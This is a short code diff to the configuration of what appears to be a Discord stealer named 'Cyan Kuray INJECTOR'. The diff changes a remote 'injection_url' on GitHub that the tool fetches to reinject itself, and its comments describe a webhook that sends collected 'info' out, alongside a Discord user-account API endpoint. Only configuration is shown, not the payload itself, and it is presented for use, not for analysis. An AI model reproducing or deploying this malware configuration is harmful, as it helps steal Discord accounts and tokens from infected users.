@@ -14,8 +14,10 @@ const config = {
   embed_name: 'Cyan Kuray INJECTOR', //name of the webhook thats gonna send the info
   embed_icon: 'https://images-ext-2.discordapp.net/external/Gu7v7UmRxtlpvRQsuPZfA0t9PGmxnzFTYFWJccidNEc/%3Fcid%3D73b8f7b14c5abfc5c477966fe5e3eb1bf04b33a7503c113d%26rid%3Dgiphy.mp4%26ct%3Dg/https/media3.giphy.com/media/05IWH4WAl6yrgFhyRl/giphy.mp4'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 0000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/portu22/cyaninject/injection.js', //injection url for when it reinjects
- 
+  injection_url: 'https://raw.githubusercontent.com/portu22/cyaninject/main/injector.js', //injection url for when it reinjects
+  /**
+   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
+   **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
